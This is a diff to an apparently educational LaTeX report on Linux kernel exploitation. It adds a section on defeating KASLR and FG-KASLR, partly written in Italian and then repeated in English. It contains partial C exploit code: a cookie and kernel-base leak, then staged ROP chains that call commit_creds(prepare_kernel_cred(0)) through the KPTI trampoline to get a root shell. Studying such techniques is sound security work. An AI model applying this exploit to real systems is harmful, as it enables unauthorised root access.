@@ -531,15 +531,210 @@ So, even if different from the one seen in the paragraph (subsection {Second sce
 \section{Adding SMAP}
 This feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written.
 In the kernel, this is enabled by setting the 21st bit of Control Register CR4.
-
-The situation becomes significantly different for the two scenarios:
-
-In the first scenario, our whole ROP chain is stored on the kernel stack, and no data are accessed from the userland. Therefore, our previous payload would still be viable without any modification.
-However in the second scenario, recall that we actually pivot the stack into a page in the userland. Operations like push and pop the stack require read and write access to it, and SMAP prevents that from happening. As a result, the stack pivoting payload would no longer be viable. In fact, as far as I know, our current read and write primitives from the stack is not enough to produce a successful exploit, we would need a far stronger primitive to exploit the kernel module in this case, which may involve knowledge of the page tables and page directory, or some other advanced topics.
-
-da capire
+If we consider the (overwrite C4) section, the idea of having the entire ROP chain in the kernel stack also works to bypass SMAP.
+The pivoting technique seen in the (second scenario) section is not effective because the stack push and pop operations require read and write access and SMAP does not allow this. The primitives of writing and reading from the stack seen so far do not allow for a successful exploit. So we need more primitives.
 \section{Adding KASLR and FG-KASLR}
+Con KASLR attivo, come ASLR nello user-land, l'indirizzo di base su cui viene caricata l'immagine del kernel è randomizzato ogni volta che il sistema viene avviato.
+Per ovviare a tale problema nello user-land facciamo trapelare un indirizzo nela sezione, calcoliamo l'indirizzo base della sezione da esso e quindi tutti gli altri indirizzi verrano solo spostati da lì perchè l'unica cosa randomizzata è l'indirizzo di base, mentre l'offset restano invariati.
+Teoricamente dovrebbe valere lo stesso per KASLR, ma avviando più volte il sistema e leggendo /proc/kallsyms si nota che la maggior parte dei simboli viene randomizzata da sola, senza avere un offset costante come nello user-land.
+Ciò è dovuto a FG-KASRL che riorganizza il codice del kernel al momento del caricamento su un livello di granularità per funzione.
+In teoria, se tutto nel kernel viene completamente randomizzato, sarà quasi impossibile per noi raccogliere gadget utili dall'immagine del kernel. Ma tale funzionalità di mitigazione soffre ancora di punti deboli e quindi è possibile ancora effettuare un exploit di successo
 
+With KASLR active, as ASLR in user-land, the base address on which the kernel image is loaded is randomized each time the system is booted.
+To overcome this problem in the user-land we leak an address in the section, we calculate the base address of the section from it and then all the other addresses will only be moved from there because the only randomized thing is the base address, while the offset remains unchanged.
+Theoretically, this should be the same for KASLR, but booting the system several times and reading /proc/kallsyms shows that most of the symbols are randomized by themselves, without having a constant offset like in user-land.
+This is due to FG-KASRL reorganizing the kernel code at load time on a per-function level.
+In theory, if everything in the kernel is completely randomized, it will be nearly impossible for us to collect useful gadgets from the kernel image. But such mitigation functionality still suffers from weaknesses and thus a successful exploit is still possible.
+\subsection{Gathering useful gadgets}
+This mitigation not being perfect presents regions within the code that are never randomized.
+This differs from kernel to kernel. For example, here are several functions that are never randomized:
+\begin{lstlisting}
+/ # grep __x86_retpoline_r15 /proc/kallsyms
+ffffffffbce00dc6 T __x86_retpoline_r15
+/ # grep _text /proc/kallsyms  | head -1
+ffffffffbca00000 T _text
+/ # grep swapgs_restore_regs_and_return_to_usermode /proc/kallsyms 
+ffffffffbcc00f10 T swapgs_restore_regs_and_return_to_usermode
+/ # grep ksymtab /proc/kallsyms | head -1
+ffffffffbd985198 R __start___ksymtab 
+
+/ # grep __x86_retpoline_r15 /proc/kallsyms
+ffffffff8ea00dc6 T __x86_retpoline_r15
+/ # grep _text /proc/kallsyms  | head -1
+ffffffff8e600000 T _text
+/ # grep swapgs_restore_regs_and_return_to_usermode /proc/kallsyms 
+ffffffff8e800f10 T swapgs_restore_regs_and_return_to_usermode
+/ # grep ksymtab /proc/kallsyms | head -1
+ffffffff8f585198 R __start___ksymtab
+
+/ #  grep __x86_retpoline_r15 /proc/kallsyms
+ffffffffaa000dc6 T __x86_retpoline_r15
+/ # grep _text /proc/kallsyms  | head -1
+ffffffffa9c00000 T _text
+/ # grep swapgs_restore_regs_and_return_to_usermode /proc/kallsyms 
+ffffffffa9e00f10 T swapgs_restore_regs_and_return_to_usermode
+/ # grep ksymtab /proc/kallsyms | head -1
+ffffffffaab85198 R __start___ksymtab
+\end{lstlisting}
+
+\begin{figure}[h!]
+   \makebox[\textwidth][c]{\includegraphics[height=0.61
+  \textwidth]{images/findAddressToImageBase.png}}
+   \caption{Find address in the stack in no randomize region}
+   \label{graphview}
+\end{figure}
+
+
+
+\lstinline{__ x86_retpoline_r15}, \lstinline{swapgs_restore_regs_and_return_to_usermode}, \lstinline{ksymtab} are never randomized with respect to \lstinline{_text}, and in particular both \lstinline{commit_creds} and \lstinline{prepare_kernel_cred} keep the same offset inside \lstinline{ksymtab}.
+To find the base image instead, you need to inspect the stack when reading the module, look at a large amount of data and find an address located in the \lstinline{_text} region.
+Reading 320 bytes, we find at 304th byte an address that falls in the region of \lstinline{_text}. From that value, we subtract the address of \lstinline{_text} and find the base image.
+From there we calculate the various offsets with the functions not affected by FG_KASLR:
+\begin{lstlisting}
+void leak(void){
+    unsigned n = 40;
+    unsigned long leak[n];
+    ssize_t r = read(global_fd, leak, sizeof(leak));
+    cookie = leak[16];
+    image_base = leak[38] - 0xa157ULL;
+    kpti_trampoline = image_base + 0x200f10UL + 22UL;
+    pop_rax_ret = image_base + 0x4d11UL;
+    read_mem_pop1_ret = image_base + 0x4aaeUL;
+    pop_rdi_rbp_ret = image_base + 0x38a0UL;
+    ksymtab_prepare_kernel_cred = image_base + 0xf8d4fcUL;
+    ksymtab_commit_creds = image_base + 0xf87d90UL;
+    ........
+}
+\end{lstlisting}
+From here on we have 4 stages:
+\begin{enumerate}
+\item Leaking commit_creds();
+\item Leaking prepare_kernel_cred();
+\item Calling prepare_kernel_cred(0);
+\item Calling commit_creds() and opening root shell;
+\end{enumerate}
+\subsection{Leaking commit_creds and prepare_kernel_cred()}
+The goal is to leak \lstinline{commit_creds()} and read the value_offset of \lstinline{ksymtab_commit_creds}, then add them together. We will use our 2 memory reading gadgets to read it, using the ROP technique introduced in the paragraph (kpti trampoline), and safely return to the user-land via the KPTI trampoline to prepare for the next step.
+\begin{lstlisting}
+void stage_1(void){
+    unsigned n = 50;
+    unsigned long payload[n];
+    unsigned off = 16;
+    payload[off++] = cookie;
+    payload[off++] = 0x0; // rbx
+    payload[off++] = 0x0; // r12
+    payload[off++] = 0x0; // rbp
+    payload[off++] = pop_rax_ret; // return address
+    payload[off++] = ksymtab_commit_creds - 0x10; // rax <- __ksymtabs_commit_creds - 0x10
+    payload[off++] = read_mem_pop1_ret; // rax <- [__ksymtabs_commit_creds]
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = (unsigned long)get_commit_creds;
+    ....
+}
+void get_commit_creds(void){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov tmp_store, rax;"
+        ".att_syntax;"
+    );
+    commit_creds = ksymtab_commit_creds + (int)tmp_store;
+    printf("    --> commit_creds: %lx\n", commit_creds);
+    stage_2();
+}
+\end{lstlisting}
+Second stageis exactly the same as stage 1:
+\begin{lstlisting}
+void stage_2(void){
+    ...
+    //the same as 1 stage
+    ...
+    payload[off++] = ksymtab_prepare_kernel_cred - 0x10; // rax <- __ksymtabs_prepare_kernel_cred - 0x10
+    payload[off++] = read_mem_pop1_ret; // rax <- [__ksymtabs_prepare_kernel_cred]
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = (unsigned long)get_prepare_kernel_cred;
+    ....
+}
+
+void get_prepare_kernel_cred(void){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov tmp_store, rax;"
+        ".att_syntax;"
+    );
+    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store;
+    printf("    --> prepare_kernel_cred: %lx\n", prepare_kernel_cred);
+    stage_3();
+}
+
+\end{lstlisting}
+\subsection{Calling commit_creds(prepare_kernel_cred(0))}
+Since the number of gadgets is limited, it was impossible to find a ROP chain calling \lstinline{commit_creds(prepare_kernel_cred(0))}.
+The only solution is to divide the chain into two parts:
+\begin{itemize}
+  \item Call \lstinline{prepare_kernel_cred (0)} function saving the return value in \emph{rax}.
+   \item Call \lstinline{commit_creds ()} function using the value we have in \emph{rax}.
+\end{itemize}
+This way we bypass a fairly difficult part of the ROP chain, move the value received from \lstinline{prepare_kernel_cred(0)} from \emph{rax} to \emph{rdi} and pass it to the \lstinline{commit_creds()} function.
+\begin{lstlisting}
+void stage_3(void){
+    ...
+    As stage 1
+    ...
+    payload[off++] = pop_rdi_rbp_ret; // return address
+    payload[off++] = 0; // rdi <- 0
+    payload[off++] = 0; // dummy rbp
+    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = (unsigned long)after_prepare_kernel_cred;
+    payload[off++] = user_cs;
+    payload[off++] = user_rflags;
+    payload[off++] = user_sp;
+    payload[off++] = user_ss;
+    ....
+}
+
+void after_prepare_kernel_cred(void){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov tmp_store, rax;"
+        ".att_syntax;"
+    );
+    returned_creds_struct = tmp_store;
+    printf("    --> returned_creds_struct: %lx\n", returned_creds_struct);
+    stage_4();
+}
+
+void stage_4(void){
+    ...
+    As stage 3
+    ...
+    payload[off++] = returned_creds_struct; // rdi <- returned_creds_struct
+    payload[off++] = 0; // dummy rbp
+    payload[off++] = commit_creds; // commit_creds(returned_creds_struct)
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = (unsigned long)get_shell;
+    payload[off++] = user_cs;
+    payload[off++] = user_rflags;
+    payload[off++] = user_sp;
+    payload[off++] = user_ss;
+
+    puts("[*] Prepared payload to call commit_creds(returned_creds_struct)");
+    ssize_t w = write(global_fd, payload, sizeof(payload));
+
+    puts("[!] Should never be reached");
+}
+
+\end{lstlisting} 
 \bibliographystyle{alphaurl}
 \bibliography{bib}
 \end{document}
